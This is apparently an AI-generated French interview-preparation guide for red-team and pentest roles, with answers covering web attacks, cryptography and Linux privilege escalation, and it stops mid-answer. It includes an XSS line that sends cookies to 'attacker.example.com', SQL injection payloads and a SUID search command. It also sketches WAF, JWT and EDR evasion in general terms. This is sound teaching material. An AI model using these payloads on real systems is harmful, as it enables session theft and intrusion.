# Web (applications)

(questions orientées exploitation / reconnaissance / post-exploit web). [CyberSapiens+1](https://cybersapiens.com.au/most-asked-web-application-penetration-testing-interview-questions-and-answers/?utm_source=chatgpt.com)

1. Explique le modèle d’attaque pour une application web (recon → fuzzing → exploitation → post-exploitation).
2. Donne 3 méthodes pour trouver/contourner une authentification vulnérable (session fixation, JWT manipulation, bruteforce + lockout).
3. Comment détecter et exploiter une SQL injection (typesSQLi, payloads, exfiltration via time-based)?
4. Explique XSS (stocké vs réfléchi vs DOM). Donne un exemple d’exfiltration de cookie via XSS.
5. Qu’est-ce que CSRF et comment l’atténuer / l’exploiter si l’application est vulnérable ?
6. Comment tu ferais pour contourner une WAF/IPS côté application ? (bypass d’encodage, fragmentation, polymorphisme)
7. Comment analyser un JWT mal configuré ? (alg=none, clé faible, alg confusion)
8. Quelles sont les étapes pour trouver une RCE (remote code execution) sur une app (upload, template injection, deserialization) ?
9. Explique les risques d’une désérialisation non sécurisée (Java/.NET/PHP) et donne une méthode d’exploitation.
10. Parle-moi d’un cas réel d’exploitation que tu as réalisé (ou, si hypothétique, décris le plan d’attaque).

# Crypto

(basics → attaques pratiques — ce que le recruteur attend : compréhension des primitives + pièges). [InfosecTrain+1](https://www.infosectrain.com/blog/top-cryptography-interview-questions/?utm_source=chatgpt.com)

1. Quelle est la différence entre chiffrement symétrique et asymétrique ? exemples d’usage.
2. Explique le rôle des IV et du mode d’opération (CBC vs GCM). Que se passe-t-il si l’IV est réutilisé ?
3. Qu’est-ce qu’une fonction de hachage sécurisée ? Donne des exemples (SHA-2, SHA-3) et faiblesses (MD5).
4. Explique le concept de « forward secrecy » et comment TLS l’implémente.
5. Qu’est-ce que le padding oracle attack ? Donne un exemple d’exploitation contre CBC.
6. Comment attaquer un système qui stocke des mots de passe ? (attaques par hash, salts, bcrypt/argon2)
7. Explique Kerberos au niveau chiffrement (tickets, clés de session) — quels problèmes peuvent être exploités ?
8. Donne un exemple d’attaque sur PKI (compromission CA, certificate pinning bypass).
9. Quand et pourquoi un chiffrement maison (« rolling your own crypto ») est dangereux ?
10. Expliquer une attaque contre TLS (downgrade, mauvais ciphersuites) et comment la détecter.

# Linux

(questions techniques sur exploitation d’hôtes Linux et post-exploitation). [GitHub](https://github.com/redteamcaptain/Pentesting-Interview-Questions?utm_source=chatgpt.com)

1. Expliquer le processus de démarrage (systemd) et où regarder pour des services mal configurés.
2. Comment escalader les privilèges sur Linux ? Donne 5 vecteurs courants (SUID, cron jobs, noyau vulnérable, PATH, misconfiguration sudo).
3. Qu’est-ce qu’un binaire SUID et comment l’exploiter de façon sécurisée ? Donne un exemple pratique.
4. Décrire comment tu installerais un accès persistant discret (persistence) tout en minimisant la détection.
5. Comment analyser un système pour trouver des secrets (fichiers de config, variables d’environnement, credentials en clair) ?
6. Explique l’utilisation de `strace`/`ltrace` pour le reverse engineering d’un binaire sur une box.
7. Décris la méthode pour bypasser une politique AppArmor/SELinux (ou comment en tirer parti pour la détection).
8. Comment récupérer des informations utiles depuis la mémoire (`/proc`, `ss`, `netstat`, `ps`, `lsof`)?
9. Quels outils tu utilises pour la post-exploitation (meterpreter, socat, netcat, cron, systemd timers) et pourquoi ?
10. Parle d’une expérience où tu as durci ou contourné des protections Linux (auditing/EDR).

# Windows

(internals, exploitation, outils et persistence). [Index.dev+1](https://www.index.dev/interview-questions/red-team-engineer?utm_source=chatgpt.com)

1. Explique le modèle de sécurité Windows (tokens, UAC, SID) et comment UAC peut être contourné.
2. Quelles sont les méthodes d’escalade de privilèges sous Windows ? (exploitation de services, DLL hijacking, token impersonation)
3. Explique le fonctionnement d’AMSI et des méthodes pour le bypass.
4. Que fait le Windows Credential Guard / LSA / LSASS et comment les attaquer/défendre ?    
5. Décrire la création d’un implant C2 : common techniques pour éviter l’AV/EDR (mutations, off-the-shelf vs custom)
6. Comment faire de l’OPSEC (operational security) lors d’une campagne Windows (logs, nettoyage, living off the land) ?
7. Explique la persistance via Scheduled Tasks, Services, Run keys, WMI.
8. Décrire l’usage de PowerShell pour l’intrusion (modules, encodage, AMSI bypass) et contre-mesures.
9. Comment analyser un dump LSASS pour récupérer des credentials ; quels outils utilises-tu ?
10. Explique comment détecter et contourner un EDR moderne (basics: whitelisting, hooking, ETW).

# Active Directory (AD)

(sujet clé Red Team — beaucoup de questions techniques réelles). [Medium+1](https://medium.com/meetcyber/8-realistic-interview-questions-on-attacks-against-active-directory-4a28f5e96113?utm_source=chatgpt.com)

1. Explique le flux d’authentification Kerberos dans AD (TGT, TGS). Qu’est-ce que le Kerberoasting ?
2. Qu’est-ce que l’AS-REP roasting et dans quel cas est-il applicable ?
3. Explique Pass-the-Hash et Pass-the-Ticket. Comment les prévenir ?
4. Qu’est-ce que LAPS et comment il change l’attaque sur les comptes locaux ?
5. Explique DCSync / DCSync abuse et quelles permissions sont nécessaires.
6. Comment réaliser une reconnaissance AD discrète (bloodhound, ldap queries) et limiter le bruit ?
7. Quels sont les vecteurs pour obtenir des comptes à privilèges (GPO misconfigurés, SPNs pour kerberoast, ACLs faibles) ?
8. Explique l’attaque « Over-pass the Hash » / « Golden Ticket » / « Silver Ticket » et leurs différences.
9. Méthodologie pour compromettre un domaine depuis un poste utilisateur compromis (pivot, lateral movement, credential harvesting).
10. Stratégies de mitigation et détection à recommander après un engagement Red Team.

# Forensic

(analyse post-incident, artefacts, timeline). [elhacker.info+1](https://elhacker.info/ebooks%20Joas/INTERVIEW%20QUESTION%20TIPS%20%E2%80%93%20PENTEST%2C%20RED%20TEAM%2C%20APPSEC%20AND%20BLUE%20TEAM.pdf?utm_source=chatgpt.com)

1. Décris ta méthodologie pour collecter des preuves sur une machine compromise (chain of custody, acquisition bit-for-bit).
2. Quels artefacts Windows regardes-tu pour établir une timeline (Event Logs, Prefetch, MFT, registry, schedules) ?
3. Comment analyser une image disque Linux pour trouver des traces d’intrusion ?
4. Explique comment tu détecterais un implant persistant déguisé (services, drivers, scheduled tasks, kernel modules).
5. Méthodes pour extraire des secrets depuis la mémoire (process dumps, Mimikatz pour Windows) et leurs limitations légales/éthiques.
6. Quels outils utilises-tu pour l’analyse réseau/pcap (Wireshark, tshark) et quelles signatures/indicateurs recherches-tu ?
7. Décrire comment faire de la corrélation entre logs réseau et logs hôte pour reconstituer le parcours d’un attaquant.
8. Explique l’analyse d’un binaire suspect (strings, static analysis, sandbox) — qu’est-ce que tu regardes en priorité ?
9. Quand et pourquoi utiliser des hash (MD5/SHA) pour l’intégrité des preuves ?
10. Donne un exemple de rapport forensique : quelles sections et niveau de détail proposer ?

# Réseau

(tcp/ip, pivoting, détection, protocoles). [GitHub+1](https://github.com/redteamcaptain/Pentesting-Interview-Questions?utm_source=chatgpt.com)

1. Expliquer la pile TCP/IP : différence entre TCP et UDP, handshakes, flags importants.
2. Qu’est-ce qu’un MITM et quelles techniques (ARP spoofing, DHCP spoofing, DNS spoofing) ?
3. Décrire le NAT, PAT, et comment fonctionne la translation de ports.
4. Comment réaliser du port forwarding / pivoting depuis un hôte compromis pour atteindre un réseau interne (SSH tunneling, proxychains, socat, RPort)?
5. Explique les concepts de MTU, fragmentation, et comment ils peuvent être abusés pour contourner détections.
6. Que regardes-tu dans un PCAP pour repérer un C2 ? (beacons périodiques, DNS over HTTP, trafics chiffrés atypiques)
7. Méthodes de contournement des IDS/IPS réseau (encodage, fragmentation, tunnels chiffrés).
8. Qu’est-ce que DNS exfiltration et comment la détecter ?
9. Décris la mise en place d’un canal covert (DNS, ICMP, HTTPs) et les tradeoffs OPSEC.
10. Comment concevoir des règles de détection réseau pour des comportements Red Team (ex: fréquence/beacons, connexions externes inhabituelles) ?


## Réponses:

# Web (applications)

## 1) Modèle d’attaque pour une application web (recon → fuzzing → exploitation → post-exploitation)

- **Étapes principales**
  - **Reconnaissance passive** : collecte d’informations sans interagir directement avec la cible (ex. whois, archives, moteurs de recherche).
  - **Reconnaissance active** : interrogation directe (scan de ports, crawling de pages) pour cartographier endpoints et paramètres.
  - **Fuzzing / scanning** : envoi automatisé de nombreuses requêtes (payloads) pour trouver comportements anormaux.
  - **Validation manuelle** : confirmer manuellement les découvertes automatisées pour éviter les faux positifs.
  - **Exploitation** : utiliser une vulnérabilité identifiée (ex. SQLi, XSS, RCE) pour obtenir un accès ou exfiltrer des données.
  - **Post-exploitation** : actions après accès (shell, pivot, harvest de credentials), maintenir l’accès (persistence) et limiter la détection (OPSEC).
  - **Reporting / remediation** : documenter la faille, PoC (preuve de concept) non destructrice et recommandations de correction.

- **Glossaire rapide**
  - **Whois** : base publique d’enregistrement de noms de domaine (contact, dates).
  - **Crawling** : parcourir automatiquement un site pour en lister les pages/endpoints.
  - **Endpoint** : URL ou route exposant une fonctionnalité (ex. `/login`, `/api/user`).
  - **Payload** : contenu malveillant ou test envoyé pour provoquer une vulnérabilité.
  - **False positive** : alerte indiquant une fausse vulnérabilité.
  - **RCE (Remote Code Execution)** : exécution de code arbitraire sur le serveur.
  - **Pivot** : utiliser une machine compromise pour atteindre d’autres segments réseau.
  - **Persistence** : mécanismes permettant de garder l’accès (ex. cron, scheduled task).
  - **OPSEC** : pratiques pour réduire traces et risques opérationnels.

---

## 2) 3 méthodes pour trouver / contourner une authentification vulnérable

- **Session fixation**
  - Tester si l’application **regénère l’ID de session** après authentification.
  - Méthode : forcer un cookie de session connu avant login, vérifier s’il reste valide après connexion.

- **JWT manipulation**
  - Inspecter l’en-tête (header) et les claims ; tester `alg=none`, confusion `RS256` vs `HS256`, ou clé faible.
  - Méthode : décoder base64url, modifier claims (ex : `admin:true`) et voir si la signature est validée.

- **Brute-force / credential stuffing**
  - Tester un grand nombre de mots de passe ou paires email/password (credential stuffing = réutilisation de fuites).
  - Évaluer la présence de *throttling* (limitation) et de verrous (account lockout), chercher endpoints alternatifs qui échappent au blocage.

- **Glossaire rapide**
  - **Cookie de session** : petit fichier stocké côté client identifiant une session serveur.
  - **JWT (JSON Web Token)** : jeton encodé (header.payload.signature) utilisé pour authentifier sans session serveur.
  - **alg=none** : valeur vulnérable indiquant "pas de signature" si la validation serveur est mauvaise.
  - **RS256 / HS256** : algorithmes de signature (RS = asymétrique, HS = symétrique).
  - **Credential stuffing** : automatiser l’usage de combinaisons identifiants/mots de passe obtenues ailleurs.
  - **Throttling** : limitation du nombre de requêtes sur une période.
  - **Account lockout** : verrouillage du compte après trop d’essais ratés.

---

## 3) Détecter et exploiter une SQL Injection (SQLi)
- **Qu’est-ce qu’une SQL Injection (SQLi)**
 - Attaque consistant à injecter du code SQL malveillant dans des champs d’entrée (formulaires, paramètres d’URL, headers) afin que l’application exécute des commandes SQL non prévues par le développeur.
 - Objectifs courants : lire/altérer la base, contourner l’authentification, exfiltrer données sensibles, modifier le schéma.

- **Processus de détection**
  - Tester caractères spéciaux (`'`, `"`, `--`) et tautologies (`' OR 1=1--`) pour provoquer des comportements différents.
  - Provoquer erreurs contrôlées (ex. `UNION`) pour révéler schéma de la DB si possible.
  - Si pas d’erreur, utiliser *time-based* (ex. `SLEEP(5)`) pour mesurer latence et inférer données.

- **Techniques d’exploitation**
  - **Error-based** : utiliser messages d’erreur pour extraire tables/colonnes.
  - **Union-based** : joindre le résultat d’une injection à la requête normale pour lire colonnes.
  - **Boolean / blind** : inférence bit à bit via conditions vraies/faux.
  - **Time-based** : exfiltrer en observant délai volontaire.

- **Outils**
  - `sqlmap` pour automatiser, mais commencer par tests manuels pour un PoC propre.

  **Prévention côté backend (meilleures pratiques)**

- **Utiliser des requêtes paramétrées / prepared statements** : ne jamais concaténer des entrées utilisateur dans la chaîne SQL. Les paramètres sont liés séparément par le driver DB (ex : `cursor.execute("SELECT * FROM users WHERE id = %s", (id,))`).
    
    - _Pourquoi_ : empêche l’interprétation du contenu utilisateur comme du SQL.

- **Glossaire rapide**
  - **Tautologie** : expression toujours vraie (ex : `1=1`) utilisée pour contourner filtres.
  - **UNION SELECT** : clause SQL pour combiner résultats de plusieurs requêtes.
  - **Blind SQLi** : quand l’application ne renvoie pas d’erreur, on infère via réponses booléennes ou temps.
  - **Schema** : structure de la base (tables, colonnes).

---

## 4) XSS (stocké vs réfléchi vs DOM) + exemple d’exfiltration de cookie

- **Types**
  - **Reflected (réfléchi)** : payload inclus dans la requête (URL/form) et renvoyé immédiatement; souvent exploité via liens piégés.
  - **Stored (persistant)** : payload sauvegardé côté serveur (ex. commentaire) et servi à d’autres utilisateurs.
  - **DOM-based** : vulnérabilité côté client : le JavaScript manipule `location`/`innerHTML` sans sanitization.

- **Exfiltration simple de cookie**
  - Exemple JS injecté :  
 ```js
new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(document.cookie);
    ```
  - Condition : si le cookie **n’est pas** protégé par le flag `HttpOnly`, le script peut le lire et l’envoyer à un serveur contrôlé.

- **Mitigations**
  - Encoder/échaper la sortie (output encoding), utiliser **CSP** (Content Security Policy), définir cookie `HttpOnly` et `SameSite`.

- **Glossaire rapide**
  - **document.cookie** : propriété JS donnant accès aux cookies non `HttpOnly`.
  - **HttpOnly** : flag qui empêche l’accès JS au cookie (limite exfiltration via XSS).
  - **CSP (Content Security Policy)** : en-tête HTTP définissant règles de chargement/exécution de ressources (réduit XSS).
  - **Sanitization / escaping** : nettoyage ou encodage des données avant affichage pour éviter exécution.

---

## 5) CSRF (Cross-Site Request Forgery) — principe et atténuations

- **Principe**
  - Forcer un navigateur authentifié à exécuter une action (ex. transfert, suppression) sur un site via une page contrôlée par l’attaquant.

- **Exploitation simple**
  - Placer un `<form>` auto-soumis ou une requête `fetch` sur une page externe ; si le navigateur envoie automatiquement le cookie d’authentification, l’action se réalise.

- **Atténuations efficaces**
  - **Anti-CSRF tokens** : jetons uniques par session/form vérifiés côté serveur.
  - **SameSite cookies** : bloquent l’envoi automatique de cookies depuis des origines tierces.
  - Valider `Origin` / `Referer` headers pour requêtes sensibles.
  - **Double-submit cookie** : envoyer token à la fois dans cookie et paramètre et vérifier correspondance.

- **Glossaire rapide**
  - **Origin / Referer** : headers HTTP indiquant provenance d’une requête.
  - **SameSite** : attribut de cookie qui restreint son envoi depuis des sites tiers.
  - **Anti-CSRF token** : valeur aléatoire injectée dans formulaire et validée côté serveur.

---

## 6) Contourner une WAF / IPS côté application (principes éthiques inclus)

- **Approches courantes**
  - **Encodage alternatif** : URL encoding, double-encoding pour bypasser signatures textuelles.
  - **Fragmentation** : découper payload en plusieurs morceaux (chunking) pour éviter détection par pattern matching.
  - **Obfuscation / polymorphisme** : modifier l’apparence (espaces, commentaires, casse) pour casser signatures simples.
  - **Tunneling via endpoints whitelisted** : utiliser fonctionnalités légitimes (ex. upload + processing) pour exécuter payload.
  - **Tests itératifs** : envoyer petites variations pour "fingerprinter" la WAF (identifier règles).

- **Risque & éthique**
  - Toujours respecter règles d’engagement : éviter DoS, ne pas compromettre stabilité.

- **Glossaire rapide**
  - **WAF (Web Application Firewall)** : pare-feu qui filtre/règle trafic HTTP pour bloquer attaques connues.
  - **IPS (Intrusion Prevention System)** : blocage automatique d’activités malveillantes réseau/host.
  - **Signature** : motif utilisé pour identifier trafic malveillant.
  - **Tunneling** : encapsuler trafic malveillant dans un flux légitime.

---

## 7) Analyser un JWT mal configuré

- **Étapes d’analyse**
  - Décoder header & payload (base64url) pour lire `alg`, `kid`, et claims (`exp`, `iss`, `aud`).
  - Vérifier que `alg` n’est pas `none` et que la validation ne fait pas de confusion RS/HS (asymétrique vs symétrique).
  - Tester si `kid` (Key ID) référence une clé contrôlée ou si la clé publique est utilisée comme secret symétrique (confusion).
  - Vérifier la robustesse de la clé (essayer bruteforce si clé courte/faible).
  - Valider claims : expiration (`exp`), audience (`aud`), issuer (`iss`) ; tester manipulation de claims.

- **Glossaire rapide**
  - **Base64url** : encodage utilisé dans JWT (variante URL-safe de base64).
  - **alg** : algorithme de signature (ex: HS256, RS256).
  - **kid** : identifiant de clé permettant au serveur de choisir la clé de validation.
  - **Claim** : déclaration contenue dans le token (ex: `sub`, `exp`).
  - **RS256 vs HS256** : RS utilise paire clé publique/privée (asymétrique), HS utilise clé partagée (symétrique).
  - **alg=none** : option indiquant absence de signature si le serveur l’accepte, vulnérable.

---

## 8) Étapes pour trouver une RCE (upload, template injection, deserialization)

- **Méthodologie**
  - **Identifier surfaces** : endpoints d’upload, champs qui acceptent templates ou données sérialisées.
  - **Tester upload** : bypass Content-Type/extension, tenter upload d’un web-shell ou fichier contenant payload exécutable côté serveur.
  - **Vérifier template engines** : injecter payloads spécifiques (ex. Jinja2 `{{7*7}}`) pour identifier evaluation côté serveur.
  - **Tester désérialisation** : soumettre objets sérialisés modifiés et observer comportements (exceptions, connexions sortantes).
  - **Progression prudente** : commencer par PoC non destructifs, confirmer RCE avant exploitation complète.

- **Glossaire rapide**
  - **Web-shell** : script serveur donnant interface d’exécution à distance.
  - **Template engine** : moteur qui rend des templates HTML (ex: Jinja2, Twig); peut exécuter expressions si mal configuré.
  - **Désérialisation** : conversion d’un format binaire/texte en objet en mémoire; dangereuse si données non-sûres sont acceptées.
  - **Content-Type** : en-tête HTTP indiquant le type de données envoyées (`multipart/form-data`, `application/json`).
  - **PoC (Proof of Concept)** : démonstration contrôlée d’une vulnérabilité.

---

## 9) Risques d’une désérialisation non sécurisée (Java/.NET/PHP) + méthode d’exploitation

- **Risques**
  - Exécution de code arbitraire via **gadget chains** (suites de classes qui, lors de la désérialisation, déclenchent des comportements dangereux).
  - Escalade de privilèges, fuite d’informations ou exécution de commandes systèmes.

- **Méthode d’exploitation (général)**
  - Identifier le langage & framework côté serveur.
  - Construire un objet sérialisé malveillant contenant un gadget chain connu (ex. `ysoserial` pour Java).
  - Envoyer le payload au endpoint qui désérialise et observer exécution (commande, callback réseau).

- **Mitigations**
  - Éviter désérialiser des données non-fiables.
  - Utiliser allowlists de classes, signer/encrypter objets, préférer JSON/format safe.

- **Glossaire rapide**
  - **Gadget chain** : série de classes/méthodes qui, combinées, permettent exécution malveillante lors de la désérialisation.
  - **ysoserial** : outil pour générer payloads de désérialisation Java exploitables.
  - **Allowlist** : liste autorisée (opposé à blocklist), contrôle plus strict sur ce qui est permis.

---

## 10) Raconter un cas réel / plan d’attaque (structure et points à mentionner)

- **Structure idéale (STAR)**
  - **Situation** : contexte (type d’app, portée autorisée).
  - **Task** : objectif (ex: prouver accès sans détruire).
  - **Action** : étapes (recon, tests manuels, exploitation, post-exploit).
  - **Result** : impact, preuve (PoC), recommandations et remédiations proposées.

- **Ce qu’il faut mettre en avant**
  - Respect des règles d’engagement et limites légales.
  - Mesures OPSEC (logs, tests non destructifs).
  - Remédiations techniques précises (ex: paramétrer `HttpOnly`, patch libs, utiliser allowlist).
  - Preuves mesurables sans divulguer de données sensibles (hashes, screenshots anonymisés, extrait de logs).

- **Glossaire rapide**
  - **STAR** : méthode de réponse en entretien (Situation, Task, Action, Result).
  - **PoC non destructif** : preuve montrant la faille sans endommager le système.
  - **Rules of engagement** : conditions légales/contractuelles définissant ce qu’on a le droit de tester.


# Crypto 


## 1) Différence entre chiffrement symétrique et asymétrique

- **Chiffrement symétrique**
  - Même clé pour chiffrer et déchiffrer (ex: AES).
  - Avantages : rapide, adapté aux données volumineuses.
  - Inconvénients : distribution de la clé (problème de partage sécurisé).
- **Chiffrement asymétrique**
  - Paire de clés : publique (partagée) et privée (gardée secrète) (ex: RSA, ECC).
  - Avantages : permet d’échanger des clés en toute sécurité (ex: échange de clé), signatures numériques.
  - Inconvénients : plus lent, souvent utilisé pour chiffrer de petites données ou pour établir un canal sécurisé.
- **Scénarios d’usage**
  - Hybride : utiliser asymétrique pour échanger une clé symétrique, puis AES pour le flux de données.
- **Glossaire rapide**
  - **AES** : algorithme de chiffrement symétrique courant.
  - **RSA / ECC** : algorithmes asymétriques (ECC = courbes elliptiques, plus efficaces pour clés courtes).
  - **Signature numérique** : preuve qu’un message vient du détenteur de la clé privée.

---

## 2) Rôle des IV et modes d’opération (CBC vs GCM). Problème si IV réutilisé

- **IV (Initialization Vector)**
  - Valeur initiale utilisée pour rendre le chiffrement non déterministe et empêcher répétition des motifs.
  - Doit être unique (et parfois aléatoire) selon le mode utilisé.
- **Modes d’opération**
  - **CBC (Cipher Block Chaining)** : chaque bloc chiffré dépend du bloc précédent XORé avec l’IV ; nécessite padding.
  - **GCM (Galois/Counter Mode)** : mode par compteur fournissant chiffrement + authentification (AEAD — Authenticated Encryption with Associated Data) ; protège intégrité et confidentialité.
- **IV réutilisé**
  - En **CBC**, réutiliser un IV peut permettre des attaques par pattern ou padding oracle (selon contexte).
  - En **GCM**, réutiliser un nonce/IV est catastrophique : peut conduire à récupération de la clé ou à falsification des messages.
- **Glossaire rapide**
  - **IV / nonce** : valeur d'initialisation/compteur; nonce = number used once.
  - **AEAD** : chiffrement qui assure à la fois confidentialité et intégrité.
  - **Padding** : ajout de données pour compléter un bloc obligatoire (ex: PKCS#7).

---

## 3) Fonction de hachage sécurisée vs faiblesse (MD5). Exemples

- **Fonction de hachage**
  - Transforme des données en empreinte (digest) de taille fixe.
  - Doit être rapide à calculer, mais **résistante aux collisions** (deux entrées différentes donnant même digest) et résistante aux préimages.
- **Exemples**
  - **Sécurisées** : SHA-2 (SHA-256, SHA-512), SHA-3.
  - **Faibles** : MD5, SHA-1 (collisions démontrées).
- **Usage**
  - Intégrité, signatures, dérivation de clés (avec KDFs adaptés).
- **Glossaire rapide**
  - **Collision** : deux messages différents qui produisent le même hash.
  - **Préimage** : trouver un message qui correspond à un hash donné.
  - **KDF (Key Derivation Function)** : fonction qui dérive une clé à partir d’un secret (ex: PBKDF2, Argon2).

---

## 4) Forward secrecy — concept et mise en place dans TLS

- **Forward Secrecy (Perfect Forward Secrecy, PFS)**
  - Propriété qui empêche qu’une compromission future d’une clé longue durée (ex: clé privée du serveur) ne permette de déchiffrer des sessions passées.
  - Réalisée via l’utilisation d’échanges de clés éphémères (ex: Diffie-Hellman éphémère — DHE, ou ECDHE pour ECC).
- **Dans TLS**
  - Préférer suites chiffrées avec `ECDHE`/`DHE` plutôt que RSA key exchange.
  - Configurez le serveur pour privilégier PFS et retirez suites obsolètes.
- **Glossaire rapide**
  - **Diffie-Hellman (DH)** : protocole d’échange de clé.
  - **DHE / ECDHE** : versions éphémères (DHE = DH éphémère, ECDHE = DH sur courbes elliptiques).
  - **Suite cryptographique** : combinaison d’algorithmes pour chiffrement, hash, échange de clé.

---

## 5) Padding oracle attack — explication et exemple contre CBC

- **Principe**
  - Si une application révèle (par message d’erreur, timing) si le padding d’un message déchiffré est valide, un attaquant peut déchiffrer ou forger des messages sans connaître la clé.
- **Exemple (CBC)**
  - L’attaquant modifie un bloc chiffré et observe la réponse ; en itérant et en testant valeurs, il peut retrouver byte par byte le plaintext.
- **Mitigations**
  - Ne pas renvoyer d’erreurs détaillées sur le padding ; utiliser AEAD (ex: GCM) plutôt que CBC+padding ; valider intégrité avant de signaler erreurs.
- **Glossaire rapide**
  - **Padding oracle** : oracle = source d’information; oracle de padding = retour d’info sur validité du padding.
  - **AEAD** : chiffrement authentifié évitant ce type d’attaque.

---

## 6) Attaquer un système qui stocke des mots de passe — attaques et défenses

- **Attaques**
  - **Hash bruteforce** : tenter mots de passe jusqu’à correspondance.
  - **Rainbow tables** : tables pré-calculées de hash↔mot de passe (contre hashes sans salt).
  - **Credential stuffing** : réutiliser mots de passe compromis d’autres fuites.
- **Défenses**
  - **Salt** : ajouter donnée aléatoire par utilisateur avant hash pour rendre rainbow tables inefficaces.
  - **KDFs adaptatifs** : BCrypt, Argon2, PBKDF2 avec coût configurable pour ralentir attaques.
  - **Rate limiting / MFA** : limiter essais et demander second facteur.
- **Glossaire rapide**
  - **Salt** : valeur aléatoire qui modifie le hash pour chaque utilisateur.
  - **Argon2 / BCrypt / PBKDF2** : fonctions lentes conçues pour rendre bruteforce coûteux.
  - **Rainbow table** : table pré-calculée facilitant inversion de hash simple.

---

## 7) Kerberos — chiffrement, tickets, et vecteurs exploitables

- **Concept de base**
  - Service d'authentification utilisant **tickets** : TGT (Ticket Granting Ticket) et TGS (Ticket Granting Service).
  - Tickets cryptés avec clés dérivées des mots de passe des comptes (ou clés de service).
- **Vecteurs d’attaque courants**
  - **Kerberoasting** : demander un ticket pour un service (TGS) chiffré avec la clé de service (basée sur mot de passe du service), puis brute-forcer hors ligne ce ticket pour récupérer le mot de passe du compte de service.
  - **AS-REP roasting** : si un compte n'exige pas d'auth pré-auth (pre-auth), on peut demander AS-REP et brute-forcer hors-ligne.
- **Mitigations**
  - Mots de passe forts pour comptes de service, rotation des clés, utiliser Managed Service Accounts et Kerberos armoring (FAST).
- **Glossaire rapide**
  - **TGT** : ticket initial obtenu après authentification utilisateur auprès du KDC.
  - **TGS** : ticket pour accéder à un service spécifique.
  - **Kerberoasting** : extraction hors-ligne des secrets de comptes de service via tickets TGS.

---

## 8) Attaque sur PKI (compromission CA, certificate pinning bypass)

- **Vecteurs**
  - **Compromission d’une CA** : obtenir accès à la clé privée d’une autorité de certification permet générer certificats valides pour n’importe quel domaine.
  - **Man-in-the-middle via certificat frauduleux** : utiliser certificat signé par CA compromise ou mal configurée.
  - **Certificate pinning bypass** : si pinning mal implémenté ou si l’app accepte fallback à le store système, possibilité de bypass.
- **Détections & mitigations**
  - Surveillance des certificats émis (CT logs — Certificate Transparency), implémenter pinning strict correctement, révoquer(certificates via CRL/OCSP) et monitorer CAs.
- **Glossaire rapide**
  - **CA (Certificate Authority)** : autorité qui signe/émet des certificats.
  - **CT logs** : journaux publics de certificats émis pour transparence.
  - **OCSP / CRL** : mécanismes de révocation de certificats.

---

## 9) Pourquoi le "rolling your own crypto" est dangereux

- **Risques**
  - Erreurs subtiles dans conception/protocoles qui affaiblissent la sécurité (ex: mauvaise gestion d’IV, chiffrement sans authentification).
  - Difficulté de révision formelle et tests cryptographiques.
- **Bonnes pratiques**
  - Utiliser primitives reconnues (libs auditée : libsodium, OpenSSL avec API higher-level), suivre standards (TLS, NaCl), faire valider par pair-review cryptographique.
- **Glossaire rapide**
  - **Primitive cryptographique** : composant de base (ex: AES, SHA-256).
  - **Libsodium** : bibliothèque moderne fournissant primitives sécurisées faciles à utiliser.

---

## 10) Attaque contre TLS (downgrade, mauvais ciphersuites) et détection

- **Attaques courantes**
  - **Downgrade** : forcer négociation sur versions/ciphersuites faibles (ex: SSLv3) si serveur mal configuré.
  - **Ciphersuites faibles** : utiliser suites avec RC4, MD5, ou sans PFS, vulnérables aux attaques.
  - **Man-in-the-middle avec certificats compromis**.
- **Détection**
  - Scanner les endpoints TLS (ex: `sslyze`, `testssl.sh`) pour repérer suites obsolètes, absence de PFS, support de TLS < 1.2.
  - Surveiller logs et anomalies de handshake.
- **Mitigations**
  - Désactiver anciens protocoles, prioriser suites avec ECDHE et AEAD (GCM/ChaCha20-Poly1305).
- **Glossaire rapide**
  - **Downgrade attack** : forcer utilisation d’une version/chiffre affaiblie.
  - **ChaCha20-Poly1305** : algorithme AEAD alternatif performant pour CPU sans accélération AES.
  - **sslyze/testssl.sh** : outils d’audit de configuration TLS.


# Linux 

## 1) Processus de démarrage (systemd) et où regarder pour services mal configurés

- **Étapes du démarrage (simplifié)**
  - BIOS/UEFI -> chargeur d'amorçage (GRUB) -> kernel -> `init`/`systemd`.
  - `systemd` démarre les services définis par des unit files (`.service`, `.timer`, `.socket`).
- **Où regarder pour malconfigurations**
  - `/etc/systemd/system/` et `/lib/systemd/system/` : unit files personnalisés et systèmes.
  - Journaux : `journalctl -b` (logs du boot) et `journalctl -u <service>` pour un service.
  - Fichiers de configuration : `/etc/` (ex: `/etc/ssh/sshd_config`), scripts init, cron jobs.
- **Recherches utiles**
  - chercher services démarrant avec privilèges root, chemins absolus non sécurisés, ExecStart pointant vers scripts modifiables.
- **Glossaire rapide**
  - **systemd** : système d'init moderne gérant services, dépendances et timers.
  - **Unit file** : fichier de configuration pour `systemd` (ex: `nginx.service`).
  - **journalctl** : outil pour lire les logs système fournis par `systemd`/journald.

---

## 2) Escalade de privilèges sur Linux — 5 vecteurs courants

- **SUID (Set UID)**
  - Binaire marqué SUID s'exécute avec l'UID du propriétaire (souvent root) même si lancé par un utilisateur non privilégié.
  - Recherche : `find / -perm -4000 -type f 2>/dev/null`
  - Exploitation : si le binaire a une vuln ou permet exécution de commandes, il peut permettre root.
- **Cron jobs mal configurés**
  - Jobs planifiés exécutés par root qui lancent scripts/modifient fichiers dans des répertoires écrits par l'utilisateur.
  - Exploitation : remplacer script ou modifier PATH pour exécuter code arbitraire.
- **Noyau vulnérable (kernel exploit)**
  - Failles locales dans le kernel peuvent permettre escalation si exploit disponible et compatible.
- **PATH/LD_LIBRARY_PATH manipulation**
  - Services qui exécutent /usr/bin/tool sans chemin absolu peuvent être trompés en plaçant un binaire du même nom dans un répertoire plus haut dans PATH.
  - LD_PRELOAD/LD_LIBRARY_PATH peuvent forcer le chargement de bibliothèques arbitraires si un binaire charge des libs dynamiquement sans clearance.
- **Misconfiguration sudo**
  - Permissions sudo trop permissives (ex: `NOPASSWD: /bin/bash` ou scripts éditables) ou utilisation dangereuse de `visudo`.
  - Vérifier `sudo -l` pour la liste des commandes autorisées.
- **Glossaire rapide**
  - **SUID** : bit setuid ; exécution d’un binaire avec l’UID du propriétaire.
  - **Cron** : planificateur de tâches périodiques (`crontab`).
  - **LD_PRELOAD** : variable d’environnement forçant le chargement de bibliothèques partagées.
  - **sudo -l** : liste des commandes sudo autorisées pour l’utilisateur.

---

## 3) Qu’est-ce qu’un binaire SUID et comment l’exploiter (exemple pratique)

- **Concept**
  - Binaire possédant le bit SUID (`rwsr-xr-x`) s'exécute avec les privilèges du propriétaire, souvent root.
- **Méthode d’exploitation (exemple)**
  - Identifier binaire SUID vulnérable (ex: `find` version ancienne permettant `--exec` ou `less` avec `!` command).
